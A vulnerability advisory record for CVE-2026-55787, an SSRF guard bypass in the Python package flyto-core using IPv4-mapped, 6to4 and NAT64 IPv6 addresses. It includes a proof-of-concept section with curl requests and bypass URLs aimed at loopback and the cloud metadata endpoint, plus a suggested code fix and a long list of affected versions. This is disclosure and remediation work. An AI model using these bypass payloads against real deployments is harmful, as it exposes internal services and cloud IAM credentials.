@@ -1,0 +1,450 @@
+advisory_id: PYSEC-2026-2481
+datasource_id: pysec/PYSEC-2026-2481
+datasource_url: https://osv-vulnerabilities.storage.googleapis.com/PyPI/all.zip
+aliases:
+  - CVE-2026-55787
+  - GHSA-794r-5rp2-fpg8
+summary: |
+  flyto-core has SSRF guard bypass via IPv6 transition addresses (IPv4-mapped / 6to4 / NAT64) in validate_url_ssrf
+  ## Summary
+
+  `flyto-core`'s SSRF protection (`validate_url_ssrf` / `is_private_ip` in `src/core/utils.py`) blocks private and metadata destinations by resolving the host and testing the resulting IP for membership in a hardcoded `PRIVATE_IP_RANGES` list. That list contains only the *native* RFC 1918 / loopback / link-local / unique-local ranges. It does **not** account for IPv6 transition address forms that embed an IPv4 (or loopback) target:
+
+  - IPv4-mapped `::ffff:a.b.c.d`
+  - IPv4-compatible `::a.b.c.d`
+  - 6to4 `2002::/16`
+  - NAT64 well-known prefix `64:ff9b::/96` and local-use `64:ff9b:1::/48`
+
+  A workflow author can submit a URL with a literal transition-form host (for example `http://[::ffff:127.0.0.1]:8080/...` or `http://[64:ff9b::a9fe:a9fe]/latest/meta-data/`). `is_private_ip()` returns `False` for these (the address is not literally inside any listed range), so `validate_url_ssrf` lets the request through, and the `http.get` atomic module (and ~10 sibling modules that share the same guard) performs the outbound `aiohttp` fetch and returns the response body. On a host that uses NAT64/6to4 these addresses route to the embedded IPv4 endpoint (e.g. the cloud instance-metadata service `169.254.169.254`); on any dual-stack host the IPv4-mapped form is routed by the kernel directly to the embedded IPv4, including loopback and RFC 1918 internal services.
+
+  This is CWE-918 (Server-Side Request Forgery): the guard that exists specifically to keep workflow-authored URLs away from internal/metadata endpoints is bypassable, and the response body is returned to the caller (a read SSRF).
+
+  ## Affected code
+
+  `src/core/utils.py`:
+
+  - `PRIVATE_IP_RANGES` (around L297) — lists native ranges only; no `64:ff9b::/96`, no `2002::/16`, no `::ffff:0:0/96`, no `::/96`.
+  - `is_private_ip(ip_str)` (around L337) — `ipaddress.ip_address(ip_str)` then membership test against `PRIVATE_IP_RANGES`. Because the test is plain network membership (not `is_global`/`is_private` predicates), it does not unwrap transition forms, so even `::ffff:127.0.0.1` — which `ipaddress` itself classifies `is_private == True` — is **not** caught here.
+  - `validate_url_ssrf` (around L358) — resolves via `socket.getaddrinfo(hostname, None, AF_UNSPEC)` and rejects only when `is_private_ip(ip)` is `True`.
+  - `validate_url_with_env_config(url)` (around L496) — the wrapper actually invoked by the modules.
+
+  Trust boundary in `src/core/modules/atomic/http/get.py`:
+
+  - L93 `url = params.get('url')` — workflow parameter, attacker-controlled by the workflow author.
+  - L104 `validate_url_with_env_config(url)` — the guard above.
+  - L116 `async with session.get(url, headers=headers, ssl=ssl_param) as response` — `aiohttp` fetch; the body is returned to the caller.
+
+  ### How input reaches the sink (reachability)
+
+  `params['url']` (L93) is fully attacker-controlled by the workflow author. It reaches the sink with no intervening sanitization other than the SSRF guard itself: L93 read → L104 `validate_url_with_env_config(url)` (the bypassed guard) → L116 `aiohttp` `session.get`. The route is `POST /v1/execute` with body `{"module_id":"http.get","params":{"url":...}}` (bearer-token authenticated; the token is the per-instance workflow-author credential), or equivalently an `http.get` node in a workflow YAML. The response body is returned in the `data.body` field, making this a read SSRF.
+
+  The same guarded-then-fetch pattern is shared by the `http.{request,batch,paginate,session}`, `browser.goto`, `image.download`, `communication.webhook_trigger`, `notification.send`, `vector.connector` and `llm.chat` atomic modules.
+
+  ## Impact
+
+  A user who can author/execute a workflow (the product's normal untrusted-input surface — reachable over the Execution API `POST /v1/execute` with a module-execute body, or via a workflow YAML node) can drive an authenticated outbound GET to internal-only destinations that the SSRF guard is explicitly meant to block:
+
+  - Cloud instance-metadata service (`169.254.169.254`, `metadata.google.internal`) on NAT64/6to4-routed hosts via `http://[64:ff9b::a9fe:a9fe]/...`, exposing IAM credentials / instance identity.
+  - Loopback and RFC 1918 internal services on any dual-stack host via the IPv4-mapped form `http://[::ffff:127.0.0.1]:8080/...`, `http://[::ffff:10.x.x.x]/...`.
+
+  The response body is returned, so this is a read SSRF (data exfiltration from internal services), not merely a blind request. Auth required = workflow author; this is precisely the input class the guard was written to constrain, and `SECURITY.md` documents the resolved-IP check as a security control, so the bypass is against the project's own stated model. CWE-918. Severity: Medium-High.
+
+  ## PoC / Proof of concept
+
+  ### End-to-end reproduction (against pinned version)
+
+  Environment: real `flyto-core` Execution API booted from a clean install of the current default-branch HEAD (commit `4636d9f0dcf220a11cfaa1a63927b79042bfdc5c`), Python 3.12.13, `aiohttp` 3.13.5. No `FLYTO_ALLOW_PRIVATE_NETWORK` / `FLYTO_ALLOWED_HOSTS` / `FLYTO_VSCODE_LOCAL_MODE` set (production defaults).
+
+  Install and boot the real server:
+
+  ```
+  git clone https://github.com/flytohub/flyto-core && cd flyto-core
+  python3.12 -m venv venv && . venv/bin/activate
+  pip install ".[api]"
+  python -m core.api            # starts uvicorn on 127.0.0.1:8333; prints token path
+  TOKEN=$(cat ~/.flyto/.api-token-8333)   # auto-generated bearer token for /v1/execute
+  ```
+
+  Start a sentinel that stands in for an internal-only service (bound to loopback, on an allowed port 8080):
+
+  ```python
+  # sentinel.py — simulates an internal metadata/admin service reachable only from the host
+  from http.server import BaseHTTPRequestHandler, HTTPServer
+  SENTINEL = "FLYTO_SSRF_SENTINEL_INTERNAL_ec5d9a2f_IMDS_STANDIN"
+  class H(BaseHTTPRequestHandler):
+      def do_GET(self):
+          body = f"{SENTINEL} path={self.path} from={self.client_address[0]}".encode()
+          self.send_response(200); self.send_header("Content-Type","text/plain")
+          self.send_header("Content-Length",str(len(body))); self.end_headers(); self.wfile.write(body)
+      def log_message(self,*a): pass
+  HTTPServer(("127.0.0.1", 8080), H).serve_forever()
+  ```
+
+  Run `python sentinel.py` in a second terminal.
+
+  ### Negative control 1 — raw loopback literal is correctly blocked
+
+  ```
+  $ curl -s -X POST http://127.0.0.1:8333/v1/execute -H "Authorization: Bearer $TOKEN" \
+      -H "Content-Type: application/json" \
+      -d '{"module_id":"http.get","params":{"url":"http://127.0.0.1:8080/latest/meta-data/"}}'
+  {"ok":false,"data":null,"error":"Module http.get failed after 3 attempts: [NETWORK_ERROR] Hostname blocked: 127.0.0.1","browser_session":null,"duration_ms":6010}
+  ```
+
+  ### Negative control 2 — raw IMDS literal is correctly blocked
+
+  ```
+  $ curl -s -X POST http://127.0.0.1:8333/v1/execute -H "Authorization: Bearer $TOKEN" \
+      -H "Content-Type: application/json" \
+      -d '{"module_id":"http.get","params":{"url":"http://169.254.169.254/latest/meta-data/"}}'
+  {"ok":false,"data":null,"error":"Module http.get failed after 3 attempts: [NETWORK_ERROR] Hostname blocked: 169.254.169.254","browser_session":null,"duration_ms":3003}
+  ```
+
+  ### Bypass — IPv4-mapped IPv6 literal reaches the internal sentinel
+
+  ```
+  $ curl -s -X POST http://127.0.0.1:8333/v1/execute -H "Authorization: Bearer $TOKEN" \
+      -H "Content-Type: application/json" \
+      -d '{"module_id":"http.get","params":{"url":"http://[::ffff:127.0.0.1]:8080/latest/meta-data/iam/security-credentials/admin-role"}}'
+  {"ok":true,"data":{"ok":true,"data":{"status":200,"body":"FLYTO_SSRF_SENTINEL_INTERNAL_ec5d9a2f_IMDS_STANDIN path=/latest/meta-data/iam/security-credentials/admin-role from=127.0.0.1","headers":{"Server":"BaseHTTP/0.6 Python/3.12.13","Date":"Sat, 30 May 2026 08:13:39 GMT","Content-Type":"text/plain","Content-Length":"124"}}},"error":null,"browser_session":null,"duration_ms":1}
+  ```
+
+  The sentinel access log confirms the request really arrived from the app:
+
+  ```
+  [sentinel] "GET /latest/meta-data/iam/security-credentials/admin-role HTTP/1.1" 200 -
+  ```
+
+  The guard passed the transition-form host and the internal sentinel body (including the `FLYTO_SSRF_SENTINEL_INTERNAL_ec5d9a2f_IMDS_STANDIN` marker) was returned to the caller.
+
+  ### Bypass — NAT64 well-known-prefix IMDS vector reaches the SSRF gate
+
+  On this host there is no NAT64 router, so the connection cannot complete; the point is that the guard **does not raise `SSRFError`** for the NAT64 form (it proceeds to a network connect that then times out), in contrast to the raw `169.254.169.254` which is blocked at the guard:
+
+  ```
+  $ curl -s -X POST http://127.0.0.1:8333/v1/execute -H "Authorization: Bearer $TOKEN" \
+      -H "Content-Type: application/json" \
+      -d '{"module_id":"http.get","params":{"url":"http://[64:ff9b::a9fe:a9fe]/latest/meta-data/"}}'
+  {"ok":false,"data":null,"error":"Module http.get failed after 3 attempts: [NETWORK_ERROR] ","browser_session":null,"duration_ms":95805}
+  ```
+
+  (`64:ff9b::a9fe:a9fe` is the NAT64-WKP encoding of `169.254.169.254`. The empty `[NETWORK_ERROR]` is a connect timeout, **not** the `Hostname blocked` / `URL resolves to private IP` SSRF rejection seen for the raw forms — proving the guard let it through to the network layer. On a NAT64-enabled host the kernel routes this to the cloud metadata endpoint.)
+
+  ### Vector liveness on the affected runtime
+
+  Verified directly against the project's guard logic on Python 3.12.13 (the Dockerfile runtime; `requires-python >= 3.9`). Because the guard uses plain `PRIVATE_IP_RANGES` membership rather than the `is_global`/`is_private` predicates, it is **not** affected by the CPython CVE-2024-4032 (3.12.4+) reclassification, and all of these bypass the guard on every supported runtime:
+
+  ```
+  64:ff9b::a9fe:a9fe       guard_blocks=False   (NAT64-WKP -> 169.254.169.254)
+  64:ff9b::7f00:1          guard_blocks=False   (NAT64-WKP -> 127.0.0.1)
+  2002:7f00:1::            guard_blocks=False   (6to4 -> 127.0.0.1)
+  ::ffff:169.254.169.254   guard_blocks=False   (IPv4-mapped -> IMDS)
+  ::ffff:127.0.0.1         guard_blocks=False   (IPv4-mapped -> loopback)   [used in the deployed bypass above]
+  169.254.169.254          guard_blocks=True    (native, correctly blocked)
+  127.0.0.1                guard_blocks=True    (native, correctly blocked)
+  ```
+
+  ## Suggested fix
+
+  Unwrap any embedded IPv4 from IPv6 transition forms and range-check it as well as the outer address, before the membership test. Re-checking the embedded IPv4 (rather than blanket-blocking the prefix) keeps legitimate public destinations expressed in transition form allowed.
+
+  ```python
+  def _extract_embedded_ipv4(ip):
+      """IPv4 embedded in an IPv6 transition address (mapped/compat/6to4/NAT64), else None."""
+      if ip.version != 6:
+          return None
+      if ip.ipv4_mapped is not None:
+          return ip.ipv4_mapped
+      if ip.sixtofour is not None:               # 2002::/16
+          return ip.sixtofour
+      raw = int(ip).to_bytes(16, 'big')
+      if raw[:2] == b'\x00\x64' and (raw[2:4] == b'\xff\x9b' or raw[2:6] == b'\xff\x9b\x00\x01'):
+          return ipaddress.IPv4Address(raw[-4:])  # NAT64 64:ff9b::/96 and 64:ff9b:1::/48
+      if raw[:12] == bytes(12) and raw[12:] not in (bytes(4), b'\x00\x00\x00\x01'):
+          return ipaddress.IPv4Address(raw[-4:])  # IPv4-compatible ::a.b.c.d (deprecated)
+      return None
+
+
+  def is_private_ip(ip_str: str) -> bool:
+      try:
+          ip = ipaddress.ip_address(ip_str)
+      except ValueError:
+          return True
+      candidates = [ip]
+      embedded = _extract_embedded_ipv4(ip)
+      if embedded is not None:
+          candidates.append(embedded)
+      for candidate in candidates:
+          for network in PRIVATE_IP_RANGES:
+              if candidate.version == network.version and candidate in network:
+                  return True
+      return False
+  ```
+
+  ### Patched-build verification (same deployed server, fix applied)
+
+  With the fix applied to the installed `core/utils.py` and the server restarted, the previously-successful bypass is now blocked at the guard, and the NAT64 form is now an `SSRFError` instead of a connect timeout:
+
+  ```
+  # [::ffff:127.0.0.1]:8080  (was ok:true returning the sentinel; now blocked)
+  {"ok":false,"data":null,"error":"Module http.get failed after 3 attempts: [NETWORK_ERROR] URL resolves to private IP: ::ffff:127.0.0.1 -> ::ffff:127.0.0.1. Use 'allowed_hosts' to enable controlled private access.","duration_ms":5573}
+
+  # [64:ff9b::a9fe:a9fe]  (was a 95s connect timeout; now rejected at the SSRF gate)
+  {"ok":false,"data":null,"error":"Module http.get failed after 3 attempts: [NETWORK_ERROR] URL resolves to private IP: 64:ff9b::a9fe:a9fe -> 64:ff9b::a9fe:a9fe. Use 'allowed_hosts' to enable controlled private access.","duration_ms":3003}
+  ```
+
+  Public destinations expressed in transition form (e.g. `::ffff:8.8.8.8`, `64:ff9b::808:808` = 8.8.8.8) remain allowed by the fix, since the embedded IPv4 is itself public.
+
+  ## Fix PR
+
+  A fix PR with the change above plus regression tests is provided via the advisory's private temporary fork (link added to this advisory).
+
+  ## Credit
+
+  Reported by tonghuaroot. Found by independent source review and confirmed with the deployed end-to-end reproduction above. CWE-918.
+impacted_packages:
+  - purl: pkg:pypi/flyto-core
+    affected_versions: vers:pypi/1.0.0|1.0.1|1.0.2|1.0.3|1.0.4|1.0.5|1.0.6|1.0.7|1.0.8|1.0.9|1.1.0|1.1.1|1.2.0|1.3.0|1.4.0|1.5.0|1.5.1|1.5.2|1.5.4|1.6.0|1.6.1|1.6.2|1.6.3|1.6.4|1.6.5|1.7.0|1.7.1|1.7.2|1.7.3|1.7.4|1.7.5|1.7.6|1.7.7|1.7.8|1.7.9|1.8.0|1.8.1|1.8.2|1.8.3|1.8.4|1.8.5|1.8.6|1.8.7|1.8.8|1.8.9|1.8.10|1.8.11|1.8.12|1.8.13|1.8.14|1.8.15|1.8.16|1.8.17|1.9.0|1.11.0|1.12.0|1.13.0|1.14.0|1.14.1|1.14.2|1.15.0|1.16.0|1.16.1|1.16.2|1.16.3|1.16.4|1.16.5|1.16.6|1.16.7|1.16.8|1.16.9|1.16.10|2.0.0|2.0.1|2.0.2|2.0.3|2.0.4|2.0.5|2.1.0|2.1.1|2.1.2|2.1.3|2.1.4|2.2.0|2.2.1|2.2.2|2.3.0|2.3.1|2.4.0|2.4.1|2.4.2|2.4.3|2.4.4|2.4.5|2.4.6|2.4.7|2.5.0|2.5.1|2.5.2|2.6.0|2.6.1|2.7.0|2.7.1|2.7.2|2.7.3|2.7.4|2.7.5|2.7.6|2.8.0|2.9.0|2.10.0|2.11.0|2.12.0|2.12.1|2.12.2|2.12.3|2.12.4|2.12.5|2.12.6|2.12.13|2.12.15|2.12.16|2.12.17|2.12.18|2.12.19|2.12.20|2.12.21|2.12.22|2.12.23|2.12.24|2.12.25|2.12.26|2.12.27|2.12.28|2.13.0|2.13.1|2.13.2|2.13.3|2.13.4|2.14.0|2.15.0|2.15.1|2.15.2|2.15.3|2.16.1|2.16.3|2.16.4|2.17.0|2.17.1|2.17.2|2.17.3|2.17.4|2.17.5|2.17.6|2.17.7|2.17.8|2.18.0|2.18.1|2.18.2|2.18.3|2.18.4|2.18.5|2.18.6|2.18.8|2.18.9|2.18.10|2.18.11|2.19.0|2.20.0|2.20.1|2.20.2|2.20.3|2.20.4|2.23.0|2.23.1|2.23.2|2.23.3|2.24.0|2.24.1|2.24.2|2.24.3|2.24.4|2.25.0|2.25.1|2.25.2|2.25.3|2.25.4|2.25.5|2.25.6|2.25.7|2.25.8|2.25.9|2.25.10|2.25.11|2.25.12|2.25.13|2.25.14|2.25.15|2.25.16|2.25.17|2.25.18|2.25.19|2.25.20|2.25.21|2.25.22|2.25.23|2.25.24|2.25.25|2.25.26|2.25.27|2.26.0|2.26.1|2.26.2
+    fixed_versions: vers:pypi/2.26.3
+    affected_packages:
+      - pkg:pypi/flyto-core@1.0.0
+      - pkg:pypi/flyto-core@1.0.1
+      - pkg:pypi/flyto-core@1.0.2
+      - pkg:pypi/flyto-core@1.0.3
+      - pkg:pypi/flyto-core@1.0.4
+      - pkg:pypi/flyto-core@1.0.5
+      - pkg:pypi/flyto-core@1.0.6
+      - pkg:pypi/flyto-core@1.0.7
+      - pkg:pypi/flyto-core@1.0.8
+      - pkg:pypi/flyto-core@1.0.9
+      - pkg:pypi/flyto-core@1.1.0
+      - pkg:pypi/flyto-core@1.1.1
+      - pkg:pypi/flyto-core@1.2.0
+      - pkg:pypi/flyto-core@1.3.0
+      - pkg:pypi/flyto-core@1.4.0
+      - pkg:pypi/flyto-core@1.5.0
+      - pkg:pypi/flyto-core@1.5.1
+      - pkg:pypi/flyto-core@1.5.2
+      - pkg:pypi/flyto-core@1.5.4
+      - pkg:pypi/flyto-core@1.6.0
+      - pkg:pypi/flyto-core@1.6.1
+      - pkg:pypi/flyto-core@1.6.2
+      - pkg:pypi/flyto-core@1.6.3
+      - pkg:pypi/flyto-core@1.6.4
+      - pkg:pypi/flyto-core@1.6.5
+      - pkg:pypi/flyto-core@1.7.0
+      - pkg:pypi/flyto-core@1.7.1
+      - pkg:pypi/flyto-core@1.7.2
+      - pkg:pypi/flyto-core@1.7.3
+      - pkg:pypi/flyto-core@1.7.4
+      - pkg:pypi/flyto-core@1.7.5
+      - pkg:pypi/flyto-core@1.7.6
+      - pkg:pypi/flyto-core@1.7.7
+      - pkg:pypi/flyto-core@1.7.8
+      - pkg:pypi/flyto-core@1.7.9
+      - pkg:pypi/flyto-core@1.8.0
+      - pkg:pypi/flyto-core@1.8.1
+      - pkg:pypi/flyto-core@1.8.2
+      - pkg:pypi/flyto-core@1.8.3
+      - pkg:pypi/flyto-core@1.8.4
+      - pkg:pypi/flyto-core@1.8.5
+      - pkg:pypi/flyto-core@1.8.6
+      - pkg:pypi/flyto-core@1.8.7
+      - pkg:pypi/flyto-core@1.8.8
+      - pkg:pypi/flyto-core@1.8.9
+      - pkg:pypi/flyto-core@1.8.10
+      - pkg:pypi/flyto-core@1.8.11
+      - pkg:pypi/flyto-core@1.8.12
+      - pkg:pypi/flyto-core@1.8.13
+      - pkg:pypi/flyto-core@1.8.14
+      - pkg:pypi/flyto-core@1.8.15
+      - pkg:pypi/flyto-core@1.8.16
+      - pkg:pypi/flyto-core@1.8.17
+      - pkg:pypi/flyto-core@1.9.0
+      - pkg:pypi/flyto-core@1.11.0
+      - pkg:pypi/flyto-core@1.12.0
+      - pkg:pypi/flyto-core@1.13.0
+      - pkg:pypi/flyto-core@1.14.0
+      - pkg:pypi/flyto-core@1.14.1
+      - pkg:pypi/flyto-core@1.14.2
+      - pkg:pypi/flyto-core@1.15.0
+      - pkg:pypi/flyto-core@1.16.0
+      - pkg:pypi/flyto-core@1.16.1
+      - pkg:pypi/flyto-core@1.16.2
+      - pkg:pypi/flyto-core@1.16.3
+      - pkg:pypi/flyto-core@1.16.4
+      - pkg:pypi/flyto-core@1.16.5
+      - pkg:pypi/flyto-core@1.16.6
+      - pkg:pypi/flyto-core@1.16.7
+      - pkg:pypi/flyto-core@1.16.8
+      - pkg:pypi/flyto-core@1.16.9
+      - pkg:pypi/flyto-core@1.16.10
+      - pkg:pypi/flyto-core@2.0.0
+      - pkg:pypi/flyto-core@2.0.1
+      - pkg:pypi/flyto-core@2.0.2
+      - pkg:pypi/flyto-core@2.0.3
+      - pkg:pypi/flyto-core@2.0.4
+      - pkg:pypi/flyto-core@2.0.5
+      - pkg:pypi/flyto-core@2.1.0
+      - pkg:pypi/flyto-core@2.1.1
+      - pkg:pypi/flyto-core@2.1.2
+      - pkg:pypi/flyto-core@2.1.3
+      - pkg:pypi/flyto-core@2.1.4
+      - pkg:pypi/flyto-core@2.2.0
+      - pkg:pypi/flyto-core@2.2.1
+      - pkg:pypi/flyto-core@2.2.2
+      - pkg:pypi/flyto-core@2.3.0
+      - pkg:pypi/flyto-core@2.3.1
+      - pkg:pypi/flyto-core@2.4.0
+      - pkg:pypi/flyto-core@2.4.1
+      - pkg:pypi/flyto-core@2.4.2
+      - pkg:pypi/flyto-core@2.4.3
+      - pkg:pypi/flyto-core@2.4.4
+      - pkg:pypi/flyto-core@2.4.5
+      - pkg:pypi/flyto-core@2.4.6
+      - pkg:pypi/flyto-core@2.4.7
+      - pkg:pypi/flyto-core@2.5.0
+      - pkg:pypi/flyto-core@2.5.1
+      - pkg:pypi/flyto-core@2.5.2
+      - pkg:pypi/flyto-core@2.6.0
+      - pkg:pypi/flyto-core@2.6.1
+      - pkg:pypi/flyto-core@2.7.0
+      - pkg:pypi/flyto-core@2.7.1
+      - pkg:pypi/flyto-core@2.7.2
+      - pkg:pypi/flyto-core@2.7.3
+      - pkg:pypi/flyto-core@2.7.4
+      - pkg:pypi/flyto-core@2.7.5
+      - pkg:pypi/flyto-core@2.7.6
+      - pkg:pypi/flyto-core@2.8.0
+      - pkg:pypi/flyto-core@2.9.0
+      - pkg:pypi/flyto-core@2.10.0
+      - pkg:pypi/flyto-core@2.11.0
+      - pkg:pypi/flyto-core@2.12.0
+      - pkg:pypi/flyto-core@2.12.1
+      - pkg:pypi/flyto-core@2.12.2
+      - pkg:pypi/flyto-core@2.12.3
+      - pkg:pypi/flyto-core@2.12.4
+      - pkg:pypi/flyto-core@2.12.5
+      - pkg:pypi/flyto-core@2.12.6
+      - pkg:pypi/flyto-core@2.12.13
+      - pkg:pypi/flyto-core@2.12.15
+      - pkg:pypi/flyto-core@2.12.16
+      - pkg:pypi/flyto-core@2.12.17
+      - pkg:pypi/flyto-core@2.12.18
+      - pkg:pypi/flyto-core@2.12.19
+      - pkg:pypi/flyto-core@2.12.20
+      - pkg:pypi/flyto-core@2.12.21
+      - pkg:pypi/flyto-core@2.12.22
+      - pkg:pypi/flyto-core@2.12.23
+      - pkg:pypi/flyto-core@2.12.24
+      - pkg:pypi/flyto-core@2.12.25
+      - pkg:pypi/flyto-core@2.12.26
+      - pkg:pypi/flyto-core@2.12.27
+      - pkg:pypi/flyto-core@2.12.28
+      - pkg:pypi/flyto-core@2.13.0
+      - pkg:pypi/flyto-core@2.13.1
+      - pkg:pypi/flyto-core@2.13.2
+      - pkg:pypi/flyto-core@2.13.3
+      - pkg:pypi/flyto-core@2.13.4
+      - pkg:pypi/flyto-core@2.14.0
+      - pkg:pypi/flyto-core@2.15.0
+      - pkg:pypi/flyto-core@2.15.1
+      - pkg:pypi/flyto-core@2.15.2
+      - pkg:pypi/flyto-core@2.15.3
+      - pkg:pypi/flyto-core@2.16.1
+      - pkg:pypi/flyto-core@2.16.3
+      - pkg:pypi/flyto-core@2.16.4
+      - pkg:pypi/flyto-core@2.17.0
+      - pkg:pypi/flyto-core@2.17.1
+      - pkg:pypi/flyto-core@2.17.2
+      - pkg:pypi/flyto-core@2.17.3
+      - pkg:pypi/flyto-core@2.17.4
+      - pkg:pypi/flyto-core@2.17.5
+      - pkg:pypi/flyto-core@2.17.6
+      - pkg:pypi/flyto-core@2.17.7
+      - pkg:pypi/flyto-core@2.17.8
+      - pkg:pypi/flyto-core@2.18.0
+      - pkg:pypi/flyto-core@2.18.1
+      - pkg:pypi/flyto-core@2.18.2
+      - pkg:pypi/flyto-core@2.18.3
+      - pkg:pypi/flyto-core@2.18.4
+      - pkg:pypi/flyto-core@2.18.5
+      - pkg:pypi/flyto-core@2.18.6
+      - pkg:pypi/flyto-core@2.18.8
+      - pkg:pypi/flyto-core@2.18.9
+      - pkg:pypi/flyto-core@2.18.10
+      - pkg:pypi/flyto-core@2.18.11
+      - pkg:pypi/flyto-core@2.19.0
+      - pkg:pypi/flyto-core@2.20.0
+      - pkg:pypi/flyto-core@2.20.1
+      - pkg:pypi/flyto-core@2.20.2
+      - pkg:pypi/flyto-core@2.20.3
+      - pkg:pypi/flyto-core@2.20.4
+      - pkg:pypi/flyto-core@2.23.0
+      - pkg:pypi/flyto-core@2.23.1
+      - pkg:pypi/flyto-core@2.23.2
+      - pkg:pypi/flyto-core@2.23.3
+      - pkg:pypi/flyto-core@2.24.0
+      - pkg:pypi/flyto-core@2.24.1
+      - pkg:pypi/flyto-core@2.24.2
+      - pkg:pypi/flyto-core@2.24.3
+      - pkg:pypi/flyto-core@2.24.4
+      - pkg:pypi/flyto-core@2.25.0
+      - pkg:pypi/flyto-core@2.25.1
+      - pkg:pypi/flyto-core@2.25.2
+      - pkg:pypi/flyto-core@2.25.3
+      - pkg:pypi/flyto-core@2.25.4
+      - pkg:pypi/flyto-core@2.25.5
+      - pkg:pypi/flyto-core@2.25.6
+      - pkg:pypi/flyto-core@2.25.7
+      - pkg:pypi/flyto-core@2.25.8
+      - pkg:pypi/flyto-core@2.25.9
+      - pkg:pypi/flyto-core@2.25.10
+      - pkg:pypi/flyto-core@2.25.11
+      - pkg:pypi/flyto-core@2.25.12
+      - pkg:pypi/flyto-core@2.25.13
+      - pkg:pypi/flyto-core@2.25.14
+      - pkg:pypi/flyto-core@2.25.15
+      - pkg:pypi/flyto-core@2.25.16
+      - pkg:pypi/flyto-core@2.25.17
+      - pkg:pypi/flyto-core@2.25.18
+      - pkg:pypi/flyto-core@2.25.19
+      - pkg:pypi/flyto-core@2.25.20
+      - pkg:pypi/flyto-core@2.25.21
+      - pkg:pypi/flyto-core@2.25.22
+      - pkg:pypi/flyto-core@2.25.23
+      - pkg:pypi/flyto-core@2.25.24
+      - pkg:pypi/flyto-core@2.25.25
+      - pkg:pypi/flyto-core@2.25.26
+      - pkg:pypi/flyto-core@2.25.27
+      - pkg:pypi/flyto-core@2.26.0
+      - pkg:pypi/flyto-core@2.26.1
+      - pkg:pypi/flyto-core@2.26.2
+    fixed_packages:
+      - pkg:pypi/flyto-core@2.26.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N
+    published_at:
+    url: https://osv-vulnerabilities.storage.googleapis.com/PyPI/all.zip
+weaknesses: []
+references:
+  - url: https://github.com/advisories/GHSA-794r-5rp2-fpg8
+    reference_type:
+    reference_id:
+  - url: https://github.com/flytohub/flyto-core
+    reference_type:
+    reference_id:
+  - url: https://github.com/flytohub/flyto-core/security/advisories/GHSA-794r-5rp2-fpg8
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-55787
+    reference_type:
+    reference_id:
+  - url: https://pypi.org/project/flyto-core
+    reference_type:
+    reference_id:
+exploits: []
